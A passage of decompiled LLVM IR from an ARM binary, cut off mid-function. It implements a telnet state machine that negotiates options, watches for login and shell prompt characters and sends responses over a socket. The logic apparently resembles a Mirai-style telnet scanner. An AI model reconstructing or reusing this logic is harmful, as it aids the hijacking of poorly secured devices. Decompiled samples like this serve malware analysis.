  store i32 %v1_10848, i32* %r3.global-to-local, align 4
  %v7_1084c = icmp eq i32 %v1_10848, 8
  store i1 %v7_1084c, i1* %cpsr_z.global-to-local, align 1
  %v5_10850 = and i32 %v1_10848, 1073741824
  %v6_10850 = icmp ne i32 %v5_10850, 0
  store i1 %v6_10850, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_10844, label %dec_label_pc_107c4.loopexit [
    i32 2, label %dec_label_pc_1087c
    i32 3, label %dec_label_pc_10960
    i32 4, label %dec_label_pc_10a08
    i32 5, label %dec_label_pc_10aa0
    i32 6, label %dec_label_pc_10bc8
    i32 7, label %dec_label_pc_10e8c
    i32 8, label %dec_label_pc_10d24
    i32 9, label %dec_label_pc_10dd8
    i32 10, label %dec_label_pc_10c7c
  ]

dec_label_pc_1087c:                               ; preds = %dec_label_pc_10844
  %v1_1087c = add i32 %v0_10844, 24
  %v2_1087c = inttoptr i32 %v1_1087c to i32*
  %v3_1087c = load i32, i32* %v2_1087c, align 4
  store i32 %v3_1087c, i32* %ip.global-to-local, align 4
  %v0_10880 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10880, i32* @r5, align 4
  store i32 0, i32* @r7, align 4
  store i32 -4, i32* %sl.global-to-local, align 4
  %v1_1088c = add i32 %v0_10844, 29
  store i32 %v1_1088c, i32* @r4, align 4
  %v3_10890119 = icmp eq i32 %v3_1087c, 0
  store i1 %v3_10890119, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_10890119, i1* %cpsr_z.global-to-local, align 1
  %v6_10894126 = icmp sgt i32 %v3_1087c, 0
  br i1 %v6_10894126, label %dec_label_pc_10898.preheader, label %dec_label_pc_10950.thread

dec_label_pc_10950.thread:                        ; preds = %dec_label_pc_1087c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_107c4.loopexit

dec_label_pc_10890.loopexit:                      ; preds = %dec_label_pc_108b0
  %v2_108b8 = add i32 %v1_108b8, 2
  store i32 %v2_108b8, i32* @r5, align 4
  %v2_108bc = add i32 %v1_108bc, 2
  store i32 %v2_108bc, i32* @r4, align 4
  %v2_108c0 = add i32 %v1_108c0, 2
  store i32 %v2_108c0, i32* @r7, align 4
  %v3_10890 = icmp uge i32 %v2_108c0, %v1_10890
  store i1 %v3_10890, i1* %cpsr_c.global-to-local, align 1
  %v9_10890 = icmp eq i32 %v2_108c0, %v1_10890
  store i1 %v9_10890, i1* %cpsr_z.global-to-local, align 1
  %v6_10894 = icmp slt i32 %v2_108c0, %v1_10890
  br i1 %v6_10894, label %dec_label_pc_10898.preheader, label %dec_label_pc_10940

dec_label_pc_10898.preheader:                     ; preds = %dec_label_pc_1087c, %dec_label_pc_10890.loopexit
  %v6_10948199 = phi i32 [ %v6_10948200, %dec_label_pc_10890.loopexit ], [ %v0_10844, %dec_label_pc_1087c ]
  %v1_108c0189 = phi i32 [ %v2_108c0, %dec_label_pc_10890.loopexit ], [ 0, %dec_label_pc_1087c ]
  %v1_108b8187 = phi i32 [ %v2_108b8, %dec_label_pc_10890.loopexit ], [ %v0_10880, %dec_label_pc_1087c ]
  %v1_108a4185 = phi i32 [ %v1_10890, %dec_label_pc_10890.loopexit ], [ %v3_1087c, %dec_label_pc_1087c ]
  %v0_10898183 = phi i32 [ %v2_108bc, %dec_label_pc_10890.loopexit ], [ %v1_1088c, %dec_label_pc_1087c ]
  br label %dec_label_pc_10898

dec_label_pc_10898:                               ; preds = %dec_label_pc_10898.preheader, %dec_label_pc_10920
  %v6_10948200 = phi i32 [ %v6_10948199, %dec_label_pc_10898.preheader ], [ %v0_10928, %dec_label_pc_10920 ]
  %v1_108c0 = phi i32 [ %v1_108c0189, %dec_label_pc_10898.preheader ], [ %v1_1092c, %dec_label_pc_10920 ]
  %v1_108b8 = phi i32 [ %v1_108b8187, %dec_label_pc_10898.preheader ], [ %v1_10934, %dec_label_pc_10920 ]
  %v1_10890 = phi i32 [ %v1_108a4185, %dec_label_pc_10898.preheader ], [ %v3_10928, %dec_label_pc_10920 ]
  %v1_108bc = phi i32 [ %v0_10898183, %dec_label_pc_10898.preheader ], [ %v1_10938, %dec_label_pc_10920 ]
  %v1_10898 = add i32 %v1_108bc, -1
  %v2_10898 = inttoptr i32 %v1_10898 to i8*
  %v3_10898 = load i8, i8* %v2_10898, align 1
  %v4_10898 = zext i8 %v3_10898 to i32
  store i32 %v4_10898, i32* %r3.global-to-local, align 4
  %v2_1089c = icmp eq i8 %v3_10898, -1
  store i1 %v2_1089c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_1089c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1089c, label %dec_label_pc_108a4, label %dec_label_pc_10940

dec_label_pc_108a4:                               ; preds = %dec_label_pc_10898
  %v0_108a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_108a4 = add i32 %v0_108a4, %v1_10890
  store i32 %v2_108a4, i32* %r2.global-to-local, align 4
  %v3_108a8 = icmp uge i32 %v2_108a4, %v1_108bc
  store i1 %v3_108a8, i1* %cpsr_c.global-to-local, align 1
  %v9_108a8 = icmp eq i32 %v2_108a4, %v1_108bc
  store i1 %v9_108a8, i1* %cpsr_z.global-to-local, align 1
  %v2_108ac = xor i1 %v3_108a8, true
  %v3_108ac = or i1 %v9_108a8, %v2_108ac
  br i1 %v3_108ac, label %dec_label_pc_10940, label %dec_label_pc_108b0

dec_label_pc_108b0:                               ; preds = %dec_label_pc_108a4
  %v1_108b0 = inttoptr i32 %v1_108bc to i8*
  %v2_108b0 = load i8, i8* %v1_108b0, align 1
  %v3_108b0 = zext i8 %v2_108b0 to i32
  store i32 %v3_108b0, i32* %r3.global-to-local, align 4
  %v2_108b4 = icmp eq i8 %v2_108b0, -1
  store i1 %v2_108b4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_108b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_108b4, label %dec_label_pc_10890.loopexit, label %dec_label_pc_108c8

dec_label_pc_108c8:                               ; preds = %dec_label_pc_108b0
  %v2_108c8 = icmp ugt i8 %v2_108b0, -4
  store i1 %v2_108c8, i1* %cpsr_c.global-to-local, align 1
  %v7_108c8 = icmp eq i8 %v2_108b0, -3
  store i1 %v7_108c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108c8, label %dec_label_pc_10f40, label %dec_label_pc_108d0

dec_label_pc_108d0:                               ; preds = %dec_label_pc_108c8
  %v1_108d0 = add i32 %v1_108b8, 2
  store i32 %v1_108d0, i32* %r3.global-to-local, align 4
  %v3_108d4 = icmp uge i32 %v2_108a4, %v1_108d0
  store i1 %v3_108d4, i1* %cpsr_c.global-to-local, align 1
  %v9_108d4 = icmp eq i32 %v2_108a4, %v1_108d0
  store i1 %v9_108d4, i1* %cpsr_z.global-to-local, align 1
  %v2_108d8 = xor i1 %v3_108d4, true
  %v3_108d8 = or i1 %v9_108d4, %v2_108d8
  br i1 %v3_108d8, label %dec_label_pc_10940, label %dec_label_pc_108dc

dec_label_pc_108dc:                               ; preds = %dec_label_pc_10f98, %bb370, %bb369, %dec_label_pc_108d0
  %v0_108dc = load i32, i32* @r4, align 4
  %v1_108dc = inttoptr i32 %v0_108dc to i8*
  %v2_108dc = load i8, i8* %v1_108dc, align 1
  %v3_108dc = zext i8 %v2_108dc to i32
  store i32 %v3_108dc, i32* %r3.global-to-local, align 4
  %v2_108e0 = icmp ugt i8 %v2_108dc, -4
  store i1 %v2_108e0, i1* %cpsr_c.global-to-local, align 1
  %v7_108e0 = icmp eq i8 %v2_108dc, -3
  store i1 %v7_108e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108e0, label %bb348, label %dec_label_pc_108ec

bb348:                                            ; preds = %dec_label_pc_108dc
  %v1_108e4 = load i32, i32* %sl.global-to-local, align 4
  %v2_108e4 = trunc i32 %v1_108e4 to i8
  store i8 %v2_108e4, i8* %v1_108dc, align 1
  %v0_108e8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_108e8.pr, label %.thread88, label %.dec_label_pc_108ec_crit_edge

.dec_label_pc_108ec_crit_edge:                    ; preds = %bb348
  %v0_108ec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_108ec

dec_label_pc_108ec:                               ; preds = %.dec_label_pc_108ec_crit_edge, %dec_label_pc_108dc
  %v0_108ec = phi i32 [ %v0_108ec.pre, %.dec_label_pc_108ec_crit_edge ], [ %v3_108dc, %dec_label_pc_108dc ]
  %v2_108ec = icmp ugt i32 %v0_108ec, 250
  store i1 %v2_108ec, i1* %cpsr_c.global-to-local, align 1
  %v7_108ec = icmp eq i32 %v0_108ec, 251
  store i1 %v7_108ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108ec, label %bb349, label %.thread88

bb349:                                            ; preds = %dec_label_pc_108ec
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_108f4 = load i32, i32* @r4, align 4
  %v4_108f4 = inttoptr i32 %v3_108f4 to i8*
  store i8 -3, i8* %v4_108f4, align 1
  br label %.thread88

.thread88:                                        ; preds = %dec_label_pc_108ec, %bb348, %bb349
  %v0_108f8 = load i32, i32* @r4, align 4
  %v1_108f8 = add i32 %v0_108f8, 1
  %v2_108f8 = inttoptr i32 %v1_108f8 to i8*
  %v3_108f8 = load i8, i8* %v2_108f8, align 1
  %v4_108f8 = zext i8 %v3_108f8 to i32
  store i32 %v4_108f8, i32* %r3.global-to-local, align 4
  %v2_108fc = icmp ugt i8 %v3_108f8, -4
  store i1 %v2_108fc, i1* %cpsr_c.global-to-local, align 1
  %v7_108fc = icmp eq i8 %v3_108f8, -3
  store i1 %v7_108fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108fc, label %bb350, label %dec_label_pc_10908

bb350:                                            ; preds = %.thread88
  %v1_10900 = load i32, i32* %sl.global-to-local, align 4
  %v2_10900 = trunc i32 %v1_10900 to i8
  store i8 %v2_10900, i8* %v2_108f8, align 1
  %v0_10904.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10904.pr, label %.thread90, label %.dec_label_pc_10908_crit_edge

.dec_label_pc_10908_crit_edge:                    ; preds = %bb350
  %v0_10908.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10908

dec_label_pc_10908:                               ; preds = %.dec_label_pc_10908_crit_edge, %.thread88
  %v0_10908 = phi i32 [ %v0_10908.pre, %.dec_label_pc_10908_crit_edge ], [ %v4_108f8, %.thread88 ]
  %v2_10908 = icmp ugt i32 %v0_10908, 250
  store i1 %v2_10908, i1* %cpsr_c.global-to-local, align 1
  %v7_10908 = icmp eq i32 %v0_10908, 251
  store i1 %v7_10908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10908, label %bb351, label %.thread90

bb351:                                            ; preds = %dec_label_pc_10908
  store i32 -3, i32* %ip.global-to-local, align 4
  %v3_10910 = load i32, i32* @r4, align 4
  %v4_10910 = add i32 %v3_10910, 1
  %v5_10910 = inttoptr i32 %v4_10910 to i8*
  store i8 -3, i8* %v5_10910, align 1
  br label %.thread90

.thread90:                                        ; preds = %dec_label_pc_10908, %bb350, %bb351
  %v0_10914 = load i32, i32* @r6, align 4
  %v1_10914 = add i32 %v0_10914, 4
  %v2_10914 = inttoptr i32 %v1_10914 to i32*
  %v3_10914 = load i32, i32* %v2_10914, align 4
  store i32 %v3_10914, i32* %r0.global-to-local, align 4
  %v0_10918 = load i32, i32* @r5, align 4
  br label %dec_label_pc_10920

dec_label_pc_10920:                               ; preds = %dec_label_pc_1110c, %.thread90
  %storemerge8 = phi i32 [ %v2_10f5c, %dec_label_pc_1110c ], [ %v0_10918, %.thread90 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_1110c ], [ 3, %.thread90 ]
  store i32 %storemerge8, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10924 = inttoptr i32 %storemerge8 to i32*
  %v5_10924 = call i32 @send(i32 16384, i32* %v4_10924, i32 %storemerge, i32 16384)
  store i32 %v5_10924, i32* %r0.global-to-local, align 4
  %v0_10928 = load i32, i32* @r6, align 4
  %v1_10928 = add i32 %v0_10928, 24
  %v2_10928 = inttoptr i32 %v1_10928 to i32*
  %v3_10928 = load i32, i32* %v2_10928, align 4
  store i32 %v3_10928, i32* %ip.global-to-local, align 4
  %v0_1092c = load i32, i32* @r7, align 4
  %v1_1092c = add i32 %v0_1092c, 3
  store i32 %v1_1092c, i32* @r7, align 4
  %v3_10930 = icmp uge i32 %v1_1092c, %v3_10928
  store i1 %v3_10930, i1* %cpsr_c.global-to-local, align 1
  %v9_10930 = icmp eq i32 %v1_1092c, %v3_10928
  store i1 %v9_10930, i1* %cpsr_z.global-to-local, align 1
  %v0_10934 = load i32, i32* @r5, align 4
  %v1_10934 = add i32 %v0_10934, 3
  store i32 %v1_10934, i32* @r5, align 4
  %v0_10938 = load i32, i32* @r4, align 4
  %v1_10938 = add i32 %v0_10938, 3
  store i32 %v1_10938, i32* @r4, align 4
  %v5_1093c = icmp slt i32 %v1_1092c, %v3_10928
  br i1 %v5_1093c, label %dec_label_pc_10898, label %dec_label_pc_10940

dec_label_pc_10940:                               ; preds = %dec_label_pc_10890.loopexit, %dec_label_pc_10898, %dec_label_pc_10920, %dec_label_pc_108d0, %dec_label_pc_108a4, %dec_label_pc_10f40.dec_label_pc_10940.loopexit_crit_edge
  %v6_10948 = phi i32 [ %v0_10f68, %dec_label_pc_10f40.dec_label_pc_10940.loopexit_crit_edge ], [ %v6_10948200, %dec_label_pc_10898 ], [ %v0_10928, %dec_label_pc_10920 ], [ %v6_10948200, %dec_label_pc_108d0 ], [ %v6_10948200, %dec_label_pc_108a4 ], [ %v6_10948200, %dec_label_pc_10890.loopexit ]
  %v0_10940 = phi i32 [ %v0_10940.pre.pre, %dec_label_pc_10f40.dec_label_pc_10940.loopexit_crit_edge ], [ %v1_108c0, %dec_label_pc_10898 ], [ %v1_1092c, %dec_label_pc_10920 ], [ %v1_108c0, %dec_label_pc_108d0 ], [ %v1_108c0, %dec_label_pc_108a4 ], [ %v2_108c0, %dec_label_pc_10890.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10940 = icmp eq i32 %v0_10940, 0
  store i1 %v2_10940, i1* %cpsr_z.global-to-local, align 1
  %tmp352 = icmp slt i32 %v0_10940, 1
  br i1 %tmp352, label %dec_label_pc_10950, label %.thread236

.thread236:                                       ; preds = %dec_label_pc_10940
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_10948 = add i32 %v6_10948, 12
  %v8_10948 = inttoptr i32 %v7_10948 to i32*
  store i32 3, i32* %v8_10948, align 4
  br label %dec_label_pc_10d00

dec_label_pc_10950:                               ; preds = %dec_label_pc_10940, %dec_label_pc_10ee0, %dec_label_pc_10e2c, %dec_label_pc_10d78, %dec_label_pc_11048, %dec_label_pc_10c1c, %dec_label_pc_10af4, %dec_label_pc_10a5c, %dec_label_pc_109c4
  %v0_10950 = phi i32 [ %v1_10ed4, %dec_label_pc_10ee0 ], [ %v1_10e20, %dec_label_pc_10e2c ], [ %v1_10d6c, %dec_label_pc_10d78 ], [ %v0_11040, %dec_label_pc_11048 ], [ %v1_10c10, %dec_label_pc_10c1c ], [ %v1_10ae8, %dec_label_pc_10af4 ], [ %v0_10a5c, %dec_label_pc_10a5c ], [ %v0_109c4, %dec_label_pc_109c4 ], [ %v0_10940, %dec_label_pc_10940 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10950 = icmp eq i32 %v0_10950, 0
  store i1 %v2_10950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10950, label %dec_label_pc_107c4.loopexit, label %dec_label_pc_10958

dec_label_pc_10958:                               ; preds = %dec_label_pc_10950
  %v0_10958 = load i32, i32* @r6, align 4
  %v1_10958 = add i32 %v0_10958, 24
  %v2_10958 = inttoptr i32 %v1_10958 to i32*
  %v3_10958 = load i32, i32* %v2_10958, align 4
  store i32 %v3_10958, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10d00

dec_label_pc_10960:                               ; preds = %dec_label_pc_10844
  %v1_10960 = add i32 %v0_10844, 24
  %v2_10960 = inttoptr i32 %v1_10960 to i32*
  %v3_10960 = load i32, i32* %v2_10960, align 4
  store i32 %v3_10960, i32* %r3.global-to-local, align 4
  %v1_10964 = add i32 %v3_10960, -1
  store i32 %v1_10964, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10968 = icmp eq i32 %v1_10964, 0
  store i1 %v2_10968, i1* %cpsr_z.global-to-local, align 1
  %v5_1096c = icmp sgt i32 %v1_10964, 0
  br i1 %v5_1096c, label %dec_label_pc_10994, label %dec_label_pc_10724

dec_label_pc_10974:                               ; preds = %bb353
  %v2_10974 = icmp ugt i8 %v3_10998, 35
  store i1 %v2_10974, i1* %cpsr_c.global-to-local, align 1
  %v7_10974 = icmp eq i8 %v3_10998, 36
  store i1 %v7_10974, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10974, label %dec_label_pc_109a8, label %dec_label_pc_1097c

dec_label_pc_1097c:                               ; preds = %dec_label_pc_10974
  %v2_1097c = icmp ugt i8 %v3_10998, 34
  store i1 %v2_1097c, i1* %cpsr_c.global-to-local, align 1
  %v7_1097c = icmp eq i8 %v3_10998, 35
  store i1 %v7_1097c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1097c, label %dec_label_pc_109a8, label %dec_label_pc_10984

dec_label_pc_10984:                               ; preds = %dec_label_pc_1097c
  %v2_10984 = icmp ugt i8 %v3_10998, 36
  store i1 %v2_10984, i1* %cpsr_c.global-to-local, align 1
  %v7_10984 = icmp eq i8 %v3_10998, 37
  store i1 %v7_10984, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10984, label %dec_label_pc_109a8, label %dec_label_pc_1098c

dec_label_pc_1098c:                               ; preds = %dec_label_pc_10984
  %v1_1098c = add i32 %v0_109a8, -1
  store i32 %v1_1098c, i32* %r0.global-to-local, align 4
  %v2_1098c = icmp ne i32 %v0_109a8, 0
  store i1 %v2_1098c, i1* %cpsr_c.global-to-local, align 1
  %v7_1098c = icmp eq i32 %v0_109a8, 1
  store i1 %v7_1098c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1098c, label %dec_label_pc_10724, label %dec_label_pc_10994

dec_label_pc_10994:                               ; preds = %dec_label_pc_10960, %dec_label_pc_1098c
  %v0_109a8 = phi i32 [ %v1_1098c, %dec_label_pc_1098c ], [ %v1_10964, %dec_label_pc_10960 ]
  %v2_10994 = add i32 %v0_109a8, %v0_10844
  store i32 %v2_10994, i32* %r3.global-to-local, align 4
  %v1_10998 = add i32 %v2_10994, 28
  %v2_10998 = inttoptr i32 %v1_10998 to i8*
  %v3_10998 = load i8, i8* %v2_10998, align 1
  %v4_10998 = zext i8 %v3_10998 to i32
  store i32 %v4_10998, i32* %r3.global-to-local, align 4
  %v2_1099c = icmp ugt i8 %v3_10998, 61
  store i1 %v2_1099c, i1* %cpsr_c.global-to-local, align 1
  %v7_1099c = icmp eq i8 %v3_10998, 62
  store i1 %v7_1099c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1099c, label %dec_label_pc_109a8, label %bb353

bb353:                                            ; preds = %dec_label_pc_10994
  %v3_109a0 = icmp ugt i8 %v3_10998, 57
  store i1 %v3_109a0, i1* %cpsr_c.global-to-local, align 1
  %v8_109a0 = icmp eq i8 %v3_10998, 58
  store i1 %v8_109a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_109a0, label %dec_label_pc_109a8, label %dec_label_pc_10974

dec_label_pc_109a8:                               ; preds = %dec_label_pc_10994, %bb353, %dec_label_pc_10984, %dec_label_pc_1097c, %dec_label_pc_10974
  %v1_109a8 = add i32 %v0_109a8, 1
  store i32 %v1_109a8, i32* @r7, align 4
  %v2_109ac = icmp eq i32 %v1_109a8, -1
  store i1 %v2_109ac, i1* %cpsr_c.global-to-local, align 1
  %v7_109ac = icmp eq i32 %v0_109a8, -2
  store i1 %v7_109ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109ac, label %dec_label_pc_10724, label %dec_label_pc_109b4

dec_label_pc_109b4:                               ; preds = %dec_label_pc_109a8
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_109b8 = call i32 @function_11294(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_109c0 = call i32 @function_11294(i32 27)
  store i32 %v1_109c0, i32* %r0.global-to-local, align 4
  %v0_109c4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_109c4

dec_label_pc_109c4:                               ; preds = %dec_label_pc_107ac, %dec_label_pc_109b4
  %v0_109c4 = phi i32 [ %v0_107bc, %dec_label_pc_107ac ], [ %v0_109c4.pre, %dec_label_pc_109b4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_109c4 = icmp eq i32 %v0_109c4, 0
  store i1 %v2_109c4, i1* %cpsr_z.global-to-local, align 1
  %tmp354 = icmp slt i32 %v0_109c4, 1
  br i1 %tmp354, label %dec_label_pc_10950, label %dec_label_pc_109cc

dec_label_pc_109cc:                               ; preds = %dec_label_pc_109c4
  %v0_109cc = load i32, i32* @r6, align 4
  %v1_109cc = inttoptr i32 %v0_109cc to i32*
  %v2_109cc = load i32, i32* %v1_109cc, align 4
  store i32 %v2_109cc, i32* %r3.global-to-local, align 4
  %v1_109d0 = add i32 %v0_109cc, 4
  %v2_109d0 = inttoptr i32 %v1_109d0 to i32*
  %v3_109d0 = load i32, i32* %v2_109d0, align 4
  store i32 %v3_109d0, i32* %r0.global-to-local, align 4
  %v1_109d4 = add i32 %v2_109cc, 12
  %v2_109d4 = inttoptr i32 %v1_109d4 to i8*
  %v3_109d4 = load i8, i8* %v2_109d4, align 1
  %v4_109d4 = zext i8 %v3_109d4 to i32
  store i32 %v4_109d4, i32* %r2.global-to-local, align 4
  %v1_109d8 = inttoptr i32 %v2_109cc to i32*
  %v2_109d8 = load i32, i32* %v1_109d8, align 4
  store i32 %v2_109d8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_109e0 = inttoptr i32 %v2_109d8 to i32*
  %v5_109e0 = call i32 @send(i32 %v3_109d0, i32* %v4_109e0, i32 %v4_109d4, i32 16384)
  store i32 %v5_109e0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_109e8 = load i32, i32* @r6, align 4
  %v1_109e8 = add i32 %v0_109e8, 4
  %v2_109e8 = inttoptr i32 %v1_109e8 to i32*
  %v3_109e8 = load i32, i32* %v2_109e8, align 4
  store i32 %v3_109e8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_120c8.257 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_109f4 = call i32 @send(i32 %v3_109e8, i32* bitcast ([3 x i8]* @global_var_120c8.257 to i32*), i32 2, i32 16384)
  store i32 %v5_109f4, i32* %r0.global-to-local, align 4
  %v0_109f8 = load i32, i32* @r6, align 4
  %v1_109f8 = add i32 %v0_109f8, 24
  %v2_109f8 = inttoptr i32 %v1_109f8 to i32*
  %v3_109f8 = load i32, i32* %v2_109f8, align 4
  store i32 %v3_109f8, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_10a00 = add i32 %v0_109f8, 12
  %v3_10a00 = inttoptr i32 %v2_10a00 to i32*
  store i32 4, i32* %v3_10a00, align 4
  br label %dec_label_pc_10d00

dec_label_pc_10a08:                               ; preds = %dec_label_pc_10844
  %v1_10a08 = add i32 %v0_10844, 24
  %v2_10a08 = inttoptr i32 %v1_10a08 to i32*
  %v3_10a08 = load i32, i32* %v2_10a08, align 4
  store i32 %v3_10a08, i32* %r3.global-to-local, align 4
  %v1_10a0c = add i32 %v3_10a08, -1
  store i32 %v1_10a0c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a10 = icmp eq i32 %v1_10a0c, 0
  store i1 %v2_10a10, i1* %cpsr_z.global-to-local, align 1
  %v5_10a14 = icmp sgt i32 %v1_10a0c, 0
  br i1 %v5_10a14, label %dec_label_pc_10a34, label %dec_label_pc_10fa8

dec_label_pc_10a1c:                               ; preds = %bb355
  %v2_10a1c = icmp ugt i8 %v3_10a38, 35
  store i1 %v2_10a1c, i1* %cpsr_c.global-to-local, align 1
  %v7_10a1c = icmp eq i8 %v3_10a38, 36
  store i1 %v7_10a1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a1c, label %dec_label_pc_10a48, label %dec_label_pc_10a24

dec_label_pc_10a24:                               ; preds = %dec_label_pc_10a1c
  %v2_10a24 = icmp ugt i8 %v3_10a38, 34
  store i1 %v2_10a24, i1* %cpsr_c.global-to-local, align 1
  %v7_10a24 = icmp eq i8 %v3_10a38, 35
  store i1 %v7_10a24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a24, label %dec_label_pc_10a48, label %dec_label_pc_10a2c

dec_label_pc_10a2c:                               ; preds = %dec_label_pc_10a24
  %v1_10a2c = add i32 %v0_10a48, -1
  store i32 %v1_10a2c, i32* %r0.global-to-local, align 4
  %v2_10a2c = icmp ne i32 %v0_10a48, 0
  store i1 %v2_10a2c, i1* %cpsr_c.global-to-local, align 1
  %v7_10a2c = icmp eq i32 %v0_10a48, 1
  store i1 %v7_10a2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a2c, label %dec_label_pc_10fa8, label %dec_label_pc_10a34

dec_label_pc_10a34:                               ; preds = %dec_label_pc_10a08, %dec_label_pc_10a2c
  %v0_10a48 = phi i32 [ %v1_10a2c, %dec_label_pc_10a2c ], [ %v1_10a0c, %dec_label_pc_10a08 ]
  %v2_10a34 = add i32 %v0_10a48, %v0_10844
  store i32 %v2_10a34, i32* %r3.global-to-local, align 4
  %v1_10a38 = add i32 %v2_10a34, 28
  %v2_10a38 = inttoptr i32 %v1_10a38 to i8*
  %v3_10a38 = load i8, i8* %v2_10a38, align 1
  %v4_10a38 = zext i8 %v3_10a38 to i32
  store i32 %v4_10a38, i32* %r3.global-to-local, align 4
  %v2_10a3c = icmp ugt i8 %v3_10a38, 61
  store i1 %v2_10a3c, i1* %cpsr_c.global-to-local, align 1
  %v7_10a3c = icmp eq i8 %v3_10a38, 62
  store i1 %v7_10a3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a3c, label %dec_label_pc_10a48, label %bb355

bb355:                                            ; preds = %dec_label_pc_10a34
  %v3_10a40 = icmp ugt i8 %v3_10a38, 57
  store i1 %v3_10a40, i1* %cpsr_c.global-to-local, align 1
  %v8_10a40 = icmp eq i8 %v3_10a38, 58
  store i1 %v8_10a40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10a40, label %dec_label_pc_10a48, label %dec_label_pc_10a1c

dec_label_pc_10a48:                               ; preds = %dec_label_pc_10a34, %bb355, %dec_label_pc_10a24, %dec_label_pc_10a1c
  %v1_10a48 = add i32 %v0_10a48, 1
  store i32 %v1_10a48, i32* @r7, align 4
  %v2_10a4c = icmp eq i32 %v1_10a48, -1
  store i1 %v2_10a4c, i1* %cpsr_c.global-to-local, align 1
  %v7_10a4c = icmp eq i32 %v0_10a48, -2
  store i1 %v7_10a4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a4c, label %dec_label_pc_10fa8, label %dec_label_pc_10a54

dec_label_pc_10a54:                               ; preds = %dec_label_pc_10a48
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_10a58 = call i32 @function_11294(i32 25)
  store i32 %v1_10a58, i32* %r0.global-to-local, align 4
  %v0_10a5c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10a5c

dec_label_pc_10a5c:                               ; preds = %dec_label_pc_10fe8, %dec_label_pc_10a54
  %v0_10a5c = phi i32 [ %v0_10ff0, %dec_label_pc_10fe8 ], [ %v0_10a5c.pre, %dec_label_pc_10a54 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a5c = icmp eq i32 %v0_10a5c, 0
  store i1 %v2_10a5c, i1* %cpsr_z.global-to-local, align 1
  %tmp356 = icmp slt i32 %v0_10a5c, 1
  br i1 %tmp356, label %dec_label_pc_10950, label %dec_label_pc_10a64

dec_label_pc_10a64:                               ; preds = %dec_label_pc_10a5c
  %v0_10a64 = load i32, i32* @r6, align 4
  %v1_10a64 = inttoptr i32 %v0_10a64 to i32*
  %v2_10a64 = load i32, i32* %v1_10a64, align 4
  store i32 %v2_10a64, i32* %r3.global-to-local, align 4
  %v1_10a68 = add i32 %v0_10a64, 4
  %v2_10a68 = inttoptr i32 %v1_10a68 to i32*
  %v3_10a68 = load i32, i32* %v2_10a68, align 4
  store i32 %v3_10a68, i32* %r0.global-to-local, align 4
  %v1_10a6c = add i32 %v2_10a64, 13
  %v2_10a6c = inttoptr i32 %v1_10a6c to i8*
  %v3_10a6c = load i8, i8* %v2_10a6c, align 1
  %v4_10a6c = zext i8 %v3_10a6c to i32
  store i32 %v4_10a6c, i32* %r2.global-to-local, align 4
  %v1_10a70 = add i32 %v2_10a64, 4
  %v2_10a70 = inttoptr i32 %v1_10a70 to i32*
  %v3_10a70 = load i32, i32* %v2_10a70, align 4
  store i32 %v3_10a70, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10a78 = inttoptr i32 %v3_10a70 to i32*
